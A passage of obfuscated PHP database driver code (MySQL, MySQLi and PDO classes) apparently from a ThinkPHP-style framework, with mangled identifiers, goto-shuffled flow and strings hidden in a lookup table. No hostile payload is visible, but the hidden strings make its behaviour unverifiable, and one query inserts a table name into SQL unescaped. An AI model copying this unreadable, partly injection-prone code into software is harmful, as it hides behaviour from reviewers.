$CšË¢œ°¥[39] => strtolower($BÈÊƒÎìˆ[$CšË¢œ°¥[40]]) == $CšË¢œ°¥[41]); } } return $d·“äµáç; } public function getTables($eÚ±Öê¬ø = '') { $E¤Â”ŠõÇ‚ =& $_SERVER[›é¼±]; if (!empty($eÚ±Öê¬ø)) { $A««¦ÑÕ = $E¤Â”ŠõÇ‚[894] . $eÚ±Öê¬ø . $E¤Â”ŠõÇ‚[895]; } else { $A««¦ÑÕ = $E¤Â”ŠõÇ‚[896]; } $C²ÃŒßÍĞ§ = $this->query($A««¦ÑÕ); $D¥êà„˜Ï = array(); foreach ($C²ÃŒßÍĞ§ as $bŞ­Àµ­¢ => $dØ—í‡ºŸ ) { $D¥êà„˜Ï[$bŞ­Àµ­¢] = current($dØ—í‡ºŸ ); } return $D¥êà„˜Ï; } public function replace($A‰íÎ˜îÙĞ, $cíù´“ãÚ = array()) { $dï¯„ï´ïİ =& $_SERVER[›é¼±]; foreach ($A‰íÎ˜îÙĞ as $e¥£‡‘¶Ù => $Aí ®¯º‰Ü) { $DîŸáİšŠø = $this->parseValue($Aí ®¯º‰Ü); if (is_scalar($DîŸáİšŠø)) { $aÊÍËÜÏ[] = $DîŸáİšŠø; $Cï‹Ñ«é¯Ê[] = $this->parseKey($e¥£‡‘¶Ù); } } $F›âÁ²‡ß = $dï¯„ï´ïİ[897] . $this->parseTable($cíù´“ãÚ[$dï¯„ï´ïİ[277]]) . $dï¯„ï´ïİ[898] . implode($dï¯„ï´ïİ[47], $Cï‹Ñ«é¯Ê) . $dï¯„ï´ïİ[899] . implode($dï¯„ï´ïİ[47], $aÊÍËÜÏ) . $dï¯„ï´ïİ[900]; return $this->execute($F›âÁ²‡ß); } public function insertAll($CùÓ“ñ§¬, $F‹÷ªñãò‰ = array(), $Cµ×¶º·§ = false) { goto cÂÄ‹°Ğè; eÀ˜æ¼ñµ: $FœçÈÕ†İº = ($Cµ×¶º·§ ? $Eˆß©ÈÚ˜[902] : $Eˆß©ÈÚ˜[903]) . $Eˆß©ÈÚ˜[904] . $this->parseTable($F‹÷ªñãò‰[$Eˆß©ÈÚ˜[277]]) . $Eˆß©ÈÚ˜[898] . implode($Eˆß©ÈÚ˜[47], $aÛÑµ‡³Ò) . $Eˆß©ÈÚ˜[905] . implode($Eˆß©ÈÚ˜[47], $eõ¥‡ó ²ï); return $this->execute($FœçÈÕ†İº); goto C÷Úğ»óÚ; cŠ¥»Ç•Ï™: $eõ¥‡ó ²ï = array(); foreach ($CùÓ“ñ§¬ as $F¦·Ë¶¿â‰) { $C¥‰“ÒÚ¸ã = array(); foreach ($F¦·Ë¶¿â‰ as $BùÖ‘Á÷™ => $bÎ²—œÎ‡Š) { $bÎ²—œÎ‡Š = $this->parseValue($bÎ²—œÎ‡Š); if (is_scalar($bÎ²—œÎ‡Š)) { $C¥‰“ÒÚ¸ã[] = $bÎ²—œÎ‡Š; } } $eõ¥‡ó ²ï[] = $Eˆß©ÈÚ˜[258] . implode($Eˆß©ÈÚ˜[47], $C¥‰“ÒÚ¸ã) . $Eˆß©ÈÚ˜[900]; } array_walk($aÛÑµ‡³Ò, array($this, $Eˆß©ÈÚ˜[901])); goto eÀ˜æ¼ñµ; cÂÄ‹°Ğè: $Eˆß©ÈÚ˜ =& $_SERVER[›é¼±]; if (!is_array($CùÓ“ñ§¬[0])) { return !1; } $aÛÑµ‡³Ò = array_keys($CùÓ“ñ§¬[0]); goto cŠ¥»Ç•Ï™; C÷Úğ»óÚ: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $Fºƒ±äëå =& $_SERVER[›é¼±]; $this->error = mysql_errno() . $Fºƒ±äëå[4] . mysql_error($this->_linkID); if ($Fºƒ±äëå[33] != $this->queryStr) { $this->error .= LNG($Fºƒ±äëå[45]) . $this->queryStr; } think_trace($this->error, $Fºƒ±äëå[33], $Fºƒ±äëå[46]); return $this->error; } public function escapeString($DË‘½ã¬²¥) { if ($this->_linkID) { return mysql_real_escape_string($DË‘½ã¬²¥, $this->_linkID); } else { return mysql_escape_string($DË‘½ã¬²¥); } } public function parseKey(&$b”ŒëŠ“èÖ, $D¨„Ñä¥™Ø = true) { $cØ‚‡†ÕÁ =& $_SERVER[›é¼±]; if ($D¨„Ñä¥™Ø) { $b”ŒëŠ“èÖ = $this->parseKeyCheck($b”ŒëŠ“èÖ); } if ($b”ŒëŠ“èÖ != $cØ‚‡†ÕÁ[182] && !preg_match($cØ‚‡†ÕÁ[906], $b”ŒëŠ“èÖ)) { $b”ŒëŠ“èÖ = $cØ‚‡†ÕÁ[383] . trim($b”ŒëŠ“èÖ, $cØ‚‡†ÕÁ[383]) . $cØ‚‡†ÕÁ[383]; } return $b”ŒëŠ“èÖ; } } class DbMysqli extends Db { public function __construct($fÁÚğØ = '') { $F»ÄŞ¦©õ =& $_SERVER[›é¼±]; if (!extension_loaded($F»ÄŞ¦©õ[795])) { think_exception(think_lang($F»ÄŞ¦©õ[10]) . $F»ÄŞ¦©õ[907]); } if (!empty($fÁÚğØ)) { $this->config = $fÁÚğØ; if (empty($this->config[$F»ÄŞ¦©õ[13]])) { $this->config[$F»ÄŞ¦©õ[13]] = $F»ÄŞ¦©õ[33]; } } } public function connect($A™ ™±Ó§ç = '', $e™©–µô = 0) { $D‘åêâ¸Ù¹ =& $_SERVER[›é¼±]; if (!isset($this->linkID[$e™©–µô])) { goto C”á±È„ÅÃ; C”á±È„ÅÃ: if (empty($A™ ™±Ó§ç)) { $A™ ™±Ó§ç = $this->config; } $this->linkID[$e™©–µô] = new mysqli($A™ ™±Ó§ç[$D‘åêâ¸Ù¹[881]], $A™ ™±Ó§ç[$D‘åêâ¸Ù¹[883]], $A™ ™±Ó§ç[$D‘åêâ¸Ù¹[884]], $A™ ™±Ó§ç[$D‘åêâ¸Ù¹[17]], $A™ ™±Ó§ç[$D‘åêâ¸Ù¹[882]] ? intval($A™ ™±Ó§ç[$D‘åêâ¸Ù¹[882]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto cˆ‰½‘á; cëˆÒöÒé: $this->connected = !0; if (1 != think_config($D‘åêâ¸Ù¹[18])) { unset($this->config); } goto d‡ä½¡ùĞ; cˆ‰½‘á: $a³İÅÄÆé» = $this->linkID[$e™©–µô]->server_version; $this->linkID[$e™©–µô]->query($D‘åêâ¸Ù¹[885] . think_config($D‘åêâ¸Ù¹[886]) . $D‘åêâ¸Ù¹[55]); if ($a³İÅÄÆé» > $D‘åêâ¸Ù¹[887]) { $this->linkID[$e™©–µô]->query($D‘åêâ¸Ù¹[888]); } goto cëˆÒöÒé; d‡ä½¡ùĞ: } return $this->linkID[$e™©–µô]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($bï½ãø’‚Œ) { goto Cìàæ¹³³; f•ƒ‚¼É²™: $this->queryStr = $bï½ãø’‚Œ; if ($this->queryID) { $this->free(); } think_action_status($D•ˆªÃö¾[19], 1); goto B²Íù‹¦³; B²Íù‹¦³: think_status($D•ˆªÃö¾[20]); $this->queryID = $this->_linkID->query($bï½ãø’‚Œ); if ($this->_linkID->more_results()) { while (($e”Ã°öÁì = $this->_linkID->next_result()) != NULL) { $e”Ã°öÁì->free_result(); } } goto BñøÜŞÃôÁ; Cìàæ¹³³: $D•ˆªÃö¾ =& $_SERVER[›é¼±]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto f•ƒ‚¼É²™; BñøÜŞÃôÁ: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto BÊï¼æŸù; BÊï¼æŸù: } public function execute($b×áç‰ö¡Š) { goto D®»»¼ç²‘; d±›ÛíÅ‘ß: think_status($CÜëùÀ¥Ø¶[20]); $Fˆ’Õàé®Ï = $this->_linkID->query($b×áç‰ö¡Š); $this->debug(); goto b‡¿”¹á¹; D®»»¼ç²‘: $CÜëùÀ¥Ø¶ =& $_SERVER[›é¼±]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto B°òÏùùÌ; B°òÏùùÌ: $this->queryStr = $b×áç‰ö¡Š; if ($this->queryID) { $this->free(); } think_action_status($CÜëùÀ¥Ø¶[21], 1); goto d±›ÛíÅ‘ß; b‡¿”¹á¹: if (!1 === $Fˆ’Õàé®Ï) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto B»ã ñ™òˆ; B»ã ñ™òˆ: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $bĞ—¼–øÕ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$bĞ—¼–øÕ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $aÉššÍøêÇ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$aÉššÍøêÇ) { $this->error(); return !1; } } return !0; } private function getAll() { $c§æÜ¼ğù½ = array(); if ($this->numRows > 0) { for ($AŠßùÔÚò¶ = 0; $AŠßùÔÚò¶ < $this->numRows; $AŠßùÔÚò¶++) { $c§æÜ¼ğù½[$AŠßùÔÚò¶] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $c§æÜ¼ğù½; } public function getFields($b§óî–˜ò—) { $B¼÷îêíÍß =& $_SERVER[›é¼±]; $A‘¥Îõ£´ï = $this->query($B¼÷îêíÍß[892] . $this->parseKey($b§óî–˜ò—)); $eù’ù“Ìğµ = array(); if ($A‘¥Îõ£´ï) { foreach ($A‘¥Îõ£´ï as $AÖè½ïô => $fŒ´†é¬ò) { $eù’ù“Ìğµ[$fŒ´†é¬ò[$B¼÷îêíÍß[27]]] = array($B¼÷îêíÍß[28] => $fŒ´†é¬ò[$B¼÷îêíÍß[27]], $B¼÷îêíÍß[29] => $fŒ´†é¬ò[$B¼÷îêíÍß[30]], $B¼÷îêíÍß[31] => (bool) ($fŒ´†é¬ò[$B¼÷îêíÍß[32]] === $B¼÷îêíÍß[33]), $B¼÷îêíÍß[34] => $fŒ´†é¬ò[$B¼÷îêíÍß[35]], $B¼÷îêíÍß[36] => strtolower($fŒ´†é¬ò[$B¼÷îêíÍß[37]]) == $B¼÷îêíÍß[38], $B¼÷îêíÍß[39] => strtolower($fŒ´†é¬ò[$B¼÷îêíÍß[40]]) == $B¼÷îêíÍß[41]); } } return $eù’ù“Ìğµ; } public function getTables($B†·ğ«›ô = '') { $A¯¿ç»»¢· =& $_SERVER[›é¼±]; $b¨‘Ñé¬Ó¦ = !empty($B†·ğ«›ô) ? $A¯¿ç»»¢·[894] . $B†·ğ«›ô . $A¯¿ç»»¢·[895] : $A¯¿ç»»¢·[896]; $d´Ëœëø©§ = $this->query($b¨‘Ñé¬Ó¦); $a·æ½ßšÛ° = array(); if ($d´Ëœëø©§) { foreach ($d´Ëœëø©§ as $dÎƒ›¢ù‡„ => $E´ÂßêÜÔ³) { $a·æ½ßšÛ°[$dÎƒ›¢ù‡„] = current($E´ÂßêÜÔ³); } } return $a·æ½ßšÛ°; } public function replace($a÷¿×éñ“ä, $D²ñøÌª–â = array()) { $DÀù†£½Íµ =& $_SERVER[›é¼±]; foreach ($a÷¿×éñ“ä as $F¾…¤‡õ‹ö => $Dæ˜ˆ˜Ğ¢°) { $dŒˆÉÎâÁ = $this->parseValue($Dæ˜ˆ˜Ğ¢°); if (is_scalar($dŒˆÉÎâÁ)) { $B˜Ã¬îõœ…[] = $dŒˆÉÎâÁ; $e÷ƒÍ™‚‘[] = $this->parseKey($F¾…¤‡õ‹ö); } } $a£è¸ğ¢«ò = $DÀù†£½Íµ[897] . $this->parseTable($D²ñøÌª–â[$DÀù†£½Íµ[277]]) . $DÀù†£½Íµ[898] . implode($DÀù†£½Íµ[47], $e÷ƒÍ™‚‘) . $DÀù†£½Íµ[899] . implode($DÀù†£½Íµ[47], $B˜Ã¬îõœ…) . $DÀù†£½Íµ[900]; return $this->execute($a£è¸ğ¢«ò); } public function insertAll($fğª¿ŞÑ, $Få¶·§Ö«ë = array(), $CÊò×íë…© = false) { goto b’—…ÁÓ”; b’—…ÁÓ”: $fø¾Ê¯öî† =& $_SERVER[›é¼±]; if (!is_array($fğª¿ŞÑ[0])) { return !1; } $fƒ†©Ê…Á = array_keys($fğª¿ŞÑ[0]); goto aêâ‰¥ù°…; aêâ‰¥ù°…: $Bíèò‹ó’Á = array(); foreach ($fğª¿ŞÑ as $BéŒ²¡Áå) { $cÈ·à‘«ˆ¾ = array(); foreach ($BéŒ²¡Áå as $D‚“ÖŞ¤“Î => $C—å©ãêÆº) { $C—å©ãêÆº = $this->parseValue($C—å©ãêÆº); if (is_scalar($C—å©ãêÆº)) { $cÈ·à‘«ˆ¾[] = $C—å©ãêÆº; } } $Bíèò‹ó’Á[] = $fø¾Ê¯öî†[258] . implode($fø¾Ê¯öî†[47], $cÈ·à‘«ˆ¾) . $fø¾Ê¯öî†[900]; } array_walk($fƒ†©Ê…Á, array($this, $fø¾Ê¯öî†[901])); goto fªÈ°™¬Ü˜; fªÈ°™¬Ü˜: $AÖßÑà´ŸÔ = $CÊò×íë…© ? $fø¾Ê¯öî†[902] : $fø¾Ê¯öî†[903]; $aœÈÂÁ”é = $AÖßÑà´ŸÔ . $fø¾Ê¯öî†[904] . $this->parseTable($Få¶·§Ö«ë[$fø¾Ê¯öî†[277]]) . $fø¾Ê¯öî†[898] . implode($fø¾Ê¯öî†[47], $fƒ†©Ê…Á) . $fø¾Ê¯öî†[905] . implode($fø¾Ê¯öî†[47], $Bíèò‹ó’Á); return $this->execute($aœÈÂÁ”é); goto dëÁÕÔ„§™; dëÁÕÔ„§™: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $Eæ½›•†· =& $_SERVER[›é¼±]; $this->error = $this->_linkID->errno . $Eæ½›•†·[4] . $this->_linkID->error; if ($Eæ½›•†·[33] != $this->queryStr) { $this->error .= LNG($Eæ½›•†·[45]) . $this->queryStr; } think_trace($this->error, $Eæ½›•†·[33], $Eæ½›•†·[46]); return $this->error; } public function escapeString($aâ£áÁ¼³Õ) { if ($this->_linkID) { return $this->_linkID->real_escape_string($aâ£áÁ¼³Õ); } else { return addslashes($aâ£áÁ¼³Õ); } } public function parseKey(&$DîöÇìãóÀ, $F¢ŒÖÃÓõ§ = true) { $dé‘šßª‚ğ =& $_SERVER[›é¼±]; if ($F¢ŒÖÃÓõ§) { $DîöÇìãóÀ = $this->parseKeyCheck($DîöÇìãóÀ); } if ($DîöÇìãóÀ != $dé‘šßª‚ğ[182] && !preg_match($dé‘šßª‚ğ[906], $DîöÇìãóÀ)) { $DîöÇìãóÀ = $dé‘šßª‚ğ[383] . trim($DîöÇìãóÀ, $dé‘šßª‚ğ[383]) . $dé‘šßª‚ğ[383]; } return $DîöÇìãóÀ; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($C¼‡ğ˜‹­ = '') { $CØ·‰Èˆ†Å =& $_SERVER[›é¼±]; if (!class_exists($CØ·‰Èˆ†Å[908])) { think_exception(think_lang($CØ·‰Èˆ†Å[10]) . $CØ·‰Èˆ†Å[909]); } if (!empty($C¼‡ğ˜‹­)) { $this->config = $C¼‡ğ˜‹­; if (empty($this->config[$CØ·‰Èˆ†Å[13]])) { $this->config[$CØ·‰Èˆ†Å[13]] = array(); } } } public function connect($DòÈâŞˆ† = '', $f›Ü¢È‰´ = 0) { $e´·ÒŠ”É =& $_SERVER[›é¼±]; if (!isset($this->linkID[$f›Ü¢È‰´])) { goto f——ğº®µÑ; fê…”¼ˆƒé: if (!$this->linkID[$f›Ü¢È‰´]) { think_exception($e´·ÒŠ”É[918]); } try { $this->linkID[$f›Ü¢È‰´]->exec($e´·ÒŠ”É[919] . think_config($e´·ÒŠ”É[886])); } catch (Exception $B¨µ•¶ï µ) { } $this->connected = !0; goto bùÌƒ–ÚŠÓ; bùÌƒ–ÚŠÓ: if (1 != think_config($e´·ÒŠ”É[18])) { unset($this->config); } goto b£ĞãøãØ; f——ğº®µÑ: if (empty($DòÈâŞˆ†)) { $DòÈâŞˆ† = $this->config; } $c Œ‘Ú®ã‡ = !empty($DòÈâŞˆ†[$e´·ÒŠ”É[13]][$e´·ÒŠ”É[14]]) ? $DòÈâŞˆ†[$e´·ÒŠ”É[13]][$e´·ÒŠ”É[14]] : $this->pconnect; if ($c Œ‘Ú®ã‡) { $DòÈâŞˆ†[$e´·ÒŠ”É[13]][PDO::ATTR_PERSISTENT] = !0; } goto F×ÃÔÒ‚šÓ; F×ÃÔÒ‚šÓ: try { $this->linkID[$f›Ü¢È‰´] = new PDO($DòÈâŞˆ†[$e´·ÒŠ”É[910]], $DòÈâŞˆ†[$e´·ÒŠ”É[883]], $DòÈâŞˆ†[$e´·ÒŠ”É[884]], $DòÈâŞˆ†[$e´·ÒŠ”É[13]]); } catch (PDOException $B¨µ•¶ï µ) { think_exception($B¨µ•¶ï µ->getMessage()); } $this->dbType = $this->_getDsnType($DòÈâŞˆ†[$e´·ÒŠ”É[910]]); if (in_array($this->dbType, array($e´·ÒŠ”É[911], $e´·ÒŠ”É[912], $e´·ÒŠ”É[913], $e´·ÒŠ”É[914]))) { think_exception($e´·ÒŠ”É[915] . $this->dbType . $e´·ÒŠ”É[916] . $this->dbType . $e´·ÒŠ”É[917]); } goto fê…”¼ˆƒé; b£ĞãøãØ: } return $this->linkID[$f›Ü¢È‰´]; } public function free() { $this->PDOStatement = null; } public function query($BÉœ‡ºš×‘, $CÊ‰÷‚‹°¢ = array()) { goto AõÚõøÇµ»; eÇ¨ğ°òñŞ: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $fƒ˜ ùªá‰ = $this->PDOStatement->execute($CÊ‰÷‚‹°¢); $this->debug(); goto E¦„Œò¾†ß; AõÚõøÇµ»: $Bİª¹Æ²›è =& $_SERVER[›é¼±]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto Fµõİ™‰ó½; Fµõİ™‰ó½: $this->queryStr = $BÉœ‡ºš×‘; if (!empty($CÊ‰÷‚‹°¢)) { $this->queryStr .= $Bİª¹Æ²›è[920] . print_r($CÊ‰÷‚‹°¢, !0) . $Bİª¹Æ²›è[921]; } if (!empty($this->PDOStatement)) { $this->free(); } goto Fª¥›ÍÊ„; E¦„Œò¾†ß: if (!1 === $fƒ˜ ùªá‰) { $this->error(); return !1; } else { return $this->getAll(); } goto fÛ¯´›Ú; Fª¥›ÍÊ„: think_action_status($Bİª¹Æ²›è[19], 1); think_status($Bİª¹Æ²›è[20]); $this->PDOStatement = $this->_linkID->prepare($BÉœ‡ºš×‘); goto eÇ¨ğ°òñŞ; fÛ¯´›Ú: } public function execute($Dª…„Îºêš, $B¥â¬äèİŒ = array()) { goto Cİ‡ŒŞ›; F–°·Ü±ÀÀ: $this->queryStr = $Dª…„Îºêš; if (!empty($B¥â¬äèİŒ)) { $this->queryStr .= $A˜Î“²ÔÖ†[920] . print_r($B¥â¬äèİŒ, !0) . $A˜Î“²ÔÖ†[921]; } $aíï¥„¼ = !1; goto C²·Ä‰•íÍ; F„´—™æì: think_status($A˜Î“²ÔÖ†[20]); $this->PDOStatement = $this->_linkID->prepare($Dª…„Îºêš); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto fÖè­Ë‹ò¢; C²·Ä‰•íÍ: if ($this->dbType == $A˜Î“²ÔÖ†[914]) { if (preg_match($A˜Î“²ÔÖ†[922], $this->queryStr, $fÅÈ‹äçÓ)) { $this->table = think_config($A˜Î“²ÔÖ†[923]) . str_ireplace(think_config($A˜Î“²ÔÖ†[924]), $A˜Î“²ÔÖ†[376], $fÅÈ‹äçÓ[2]); $aíï¥„¼ = (bool) $this->query($A˜Î“²ÔÖ†[925] . strtoupper($this->table) . $A˜Î“²ÔÖ†[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($A˜Î“²ÔÖ†[21], 1); goto F„´—™æì; fÖè­Ë‹ò¢: $C´¶ä°æÜ = $this->PDOStatement->execute($B¥â¬äèİŒ); $this->debug(); if (!1 === $C´¶ä°æÜ) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($aíï¥„¼ || preg_match($A˜Î“²ÔÖ†[926], $Dª…„Îºêš)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto fÊÅêå¦×š; Cİ‡ŒŞ›: $A˜Î“²ÔÖ† =& $_SERVER[›é¼±]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto F–°·Ü±ÀÀ; fÊÅêå¦×š: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $bä‰é«é = $this->_linkID->commit(); $this->transTimes = 0; if (!$bä‰é«é) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $B×ìœ²âØ¨ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$B×ìœ²âØ¨) { $this->error(); return !1; } } return !0; } private function getAll() { $E†Š£Ãô–Î = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($E†Š£Ãô–Î); return $E†Š£Ãô–Î; } public function getFields($c‹†ï¤«÷£) { goto Aà¨Í£í©Á; Aà¨Í£í©Á: $EíÚ‹¨¯ôâ =& $_SERVER[›é¼±]; $this->initConnect(!0); if (think_config($EíÚ‹¨¯ôâ[927])) { $DÜìé» ƒµ = str_replace($EíÚ‹¨¯ôâ[928], $c‹†ï¤«÷£, think_config($EíÚ‹¨¯ôâ[927])); } else { switch ($this->dbType) { case $EíÚ‹¨¯ôâ[911]: case $EíÚ‹¨¯ôâ[929]: $DÜìé» ƒµ = "\123\105\x4c\x45\103\x54\40\40\40\143\157\154\x75\155\x6e\x5f\156\141\x6d\x65\40\x61\163\40\47\116\x61\155\x65\47\54\x20\x20\x20\144\x61\x74\x61\x5f\x74\x79\160\145\x20\141\163\40\47\x54\171\x70\x65\47\x2c\x20\x20\x20\x63\x6f\154\x75\155\x6e\x5f\x64\x65\x66\x61\x75\154\x74\40\x61\x73\40\47\104\x65\x66\141\x75\x6c\164\47\54\40\40\40\151\x73\137\x6e\165\x6c\x6c\x61\142\154\145\40\141\x73\40\x27\116\x75\x6c\154\47\xa\11\x9\x46\122\x4f\x4d\11\x69\x6e\146\x6f\162\155\x61\x74\151\x6f\156\x5f\x73\x63\x68\x65\x6d\141\56\164\141\142\154\145\163\40\101\x53\x20\x74\12\x9\11\112\x4f\111\116\11\151\156\146\157\162\155\141\164\151\157\x6e\137\163\143\x68\x65\155\141\56\143\157\154\165\155\156\x73\40\x41\x53\x20\143\12\x9\x9\x4f\x4e\40\x20\164\56\164\x61\142\x6c\x65\137\143\141\x74\x61\154\x6f\147\40\x3d\x20\143\56\x74\141\x62\x6c\x65\x5f\x63\x61\164\141\x6c\x6f\147\xa\11\11\101\x4e\x44\x20\164\56\x74\x61\142\x6c\x65\137\x73\143\150\x65\x6d\x61\x20\75\x20\x63\56\x74\141\142\154\x65\x5f\x73\143\150\145\x6d\141\12\x9\11\x41\116\104\x20\x74\x2e\x74\141\x62\154\145\x5f\x6e\x61\x6d\x65\x20\75\40\143\56\164\x61\x62\154\x65\x5f\156\x61\155\145\12\x9\x9\x57\x48\x45\x52\105\x20\40\x20\x74\56\164\141\142\154\x65\137\156\141\x6d\x65\40\75\x20\x27{$c‹†ï¤«÷£}\x27"; break; case $EíÚ‹¨¯ôâ[930]: $DÜìé» ƒµ = $EíÚ‹¨¯ôâ[931] . $c‹†ï¤«÷£ . $EíÚ‹¨¯ôâ[932]; break; case $EíÚ‹¨¯ôâ[912]: case $EíÚ‹¨¯ôâ[914]: $DÜìé» ƒµ = $EíÚ‹¨¯ôâ[933] . $EíÚ‹¨¯ôâ[934] . $EíÚ‹¨¯ôâ[935] . strtoupper($c‹†ï¤«÷£) . $EíÚ‹¨¯ôâ[936] . strtoupper($c‹†ï¤«÷£) . $EíÚ‹¨¯ôâ[937]; break; case $EíÚ‹¨¯ôâ[938]: $DÜìé» ƒµ = $EíÚ‹¨¯ôâ[939] . $c‹†ï¤«÷£ . $EíÚ‹¨¯ôâ[940]; break; case $EíÚ‹¨¯ôâ[913]: break; case $EíÚ‹¨¯ôâ[941]: default: $DÜìé» ƒµ = $EíÚ‹¨¯ôâ[942] . ($this->dbType == $EíÚ‹¨¯ôâ[941] ? "\140{$c‹†ï¤«÷£}\140" : $c‹†ï¤«÷£); } } goto A®ˆÇˆŸ; b©ôçÀšë—: return $AàäÍ‘ïó„; goto B¾ªŞ½Ë’÷; A®ˆÇˆŸ: $c±ñ¸£Š = $this->query($DÜìé» ƒµ); $AàäÍ‘ïó„ = array(); if ($c±ñ¸£Š) { foreach ($c±ñ¸£Š as $b„àŒæ„åŒ => $E†óáÖÂÎ¿) { $E†óáÖÂÎ¿ = array_change_key_case($E†óáÖÂÎ¿); $E†óáÖÂÎ¿[$EíÚ‹¨¯ôâ[28]] = isset($E†óáÖÂÎ¿[$EíÚ‹¨¯ôâ[28]]) ? $E†óáÖÂÎ¿[$EíÚ‹¨¯ôâ[28]] : $EíÚ‹¨¯ôâ[376]; $E†óáÖÂÎ¿[$EíÚ‹¨¯ôâ[29]] = isset($E†óáÖÂÎ¿[$EíÚ‹¨¯ôâ[29]]) ? $E†óáÖÂÎ¿[$EíÚ‹¨¯ôâ[29]] : $EíÚ‹¨¯ôâ[376]; $Dìçì”Øî = isset($E†óáÖÂÎ¿[$EíÚ‹¨¯ôâ[271]]) ? $E†óáÖÂÎ¿[$EíÚ‹¨¯ôâ[271]] : $E†óáÖÂÎ¿[$EíÚ‹¨¯ôâ[28]]; $AàäÍ‘ïó„[$Dìçì”Øî] = array($EíÚ‹¨¯ôâ[28] => $Dìçì”Øî, $EíÚ‹¨¯ôâ[29] => $E†óáÖÂÎ¿[$EíÚ‹¨¯ôâ[29]], $EíÚ‹¨¯ôâ[31] => (bool) (isset($E†óáÖÂÎ¿[$EíÚ‹¨¯ôâ[103]]) && $E†óáÖÂÎ¿[$EíÚ‹¨¯ôâ[103]] === $EíÚ‹¨¯ôâ[33] || isset($E†óáÖÂÎ¿[$EíÚ‹¨¯ôâ[31]]) && $E†óáÖÂÎ¿[$EíÚ‹¨¯ôâ[31]] === $EíÚ‹¨¯ôâ[33]), $EíÚ‹¨¯ôâ[34] => isset($E†óáÖÂÎ¿[$EíÚ‹¨¯ôâ[34]]) ? $E†óáÖÂÎ¿[$EíÚ‹¨¯ôâ[34]] : (isset($E†óáÖÂÎ¿[$EíÚ‹¨¯ôâ[53]]) ? $E†óáÖÂÎ¿[$EíÚ‹¨¯ôâ[53]] : $EíÚ‹¨¯ôâ[376]), $EíÚ‹¨¯ôâ[36] => isset($E†óáÖÂÎ¿[$EíÚ‹¨¯ôâ[93]]) ? strtolower($E†óáÖÂÎ¿[$EíÚ‹¨¯ôâ[93]]) == $EíÚ‹¨¯ôâ[38] : (isset($E†óáÖÂÎ¿[$EíÚ‹¨¯ôâ[54]]) ? $E†óáÖÂÎ¿[$EíÚ‹¨¯ôâ[54]] : !1), $EíÚ‹¨¯ôâ[39] => isset($E†óáÖÂÎ¿[$EíÚ‹¨¯ôâ[943]]) ? strtolower($E†óáÖÂÎ¿[$EíÚ‹¨¯ôâ[943]]) == $EíÚ‹¨¯ôâ[41] : (isset($E†óáÖÂÎ¿[$EíÚ‹¨¯ôâ[93]]) ? $E†óáÖÂÎ¿[$EíÚ‹¨¯ôâ[93]] : !1)); } } goto b©ôçÀšë—; B¾ªŞ½Ë’÷: } public function getTables($E¹¼—ëš³² = '') { $dï×¼Êší =& $_SERVER[›é¼±]; if (think_config($dï×¼Êší[944])) { $dŞ–¾İŒÖ˜ = str_replace($dï×¼Êší[945], $E¹¼—ëš³², think_config($dï×¼Êší[944])); } else { switch ($this->dbType) { case $dï×¼Êší[912]: case $dï×¼Êší[914]: $dŞ–¾İŒÖ˜ = $dï×¼Êší[946]; break; case $dï×¼Êší[911]: case $dï×¼Êší[929]: $dŞ–¾İŒÖ˜ = $dï×¼Êší[947]; break; case $dï×¼Êší[938]: $dŞ–¾İŒÖ˜ = $dï×¼Êší[948]; break; case $dï×¼Êší[913]: think_exception(think_lang($dï×¼Êší[949]) . $dï×¼Êší[950]); break; case $dï×¼Êší[930]: $dŞ–¾İŒÖ˜ = $dï×¼Êší[42] . $dï×¼Êší[43] . $dï×¼Êší[44]; break; case $dï×¼Êší[941]: default: if (!empty($E¹¼—ëš³²)) { $dŞ–¾İŒÖ˜ = $dï×¼Êší[894] . $E¹¼—ëš³² . $dï×¼Êší[895]; } else { $dŞ–¾İŒÖ˜ = $dï×¼Êší[896]; } } } $C±£Ëø„‚õ = $this->query($dŞ–¾İŒÖ˜); $Dœœ«ÍÃÍî = array(); foreach ($C±£Ëø„‚õ as $F‡ºöÅˆ™ => $B“ä›¤¦ô­) { $Dœœ«ÍÃÍî[$F‡ºöÅˆ™] = current($B“ä›¤¦ô­); } return $Dœœ«ÍÃÍî; } protected function parseLimit($DÈŒ„ğºÔë) { $b¯Ú÷õ£®Æ =& $_SERVER[›é¼±]; $c‚ Ì„ôŒá = $b¯Ú÷õ£®Æ[33]; if (!empty($DÈŒ„ğºÔë)) { switch ($this->dbType) { case $b¯Ú÷õ£®Æ[938]: case $b¯Ú÷õ£®Æ[930]: $DÈŒ„ğºÔë = explode($b¯Ú÷õ£®Æ[47], $DÈŒ„ğºÔë); if (count($DÈŒ„ğºÔë) > 1) { 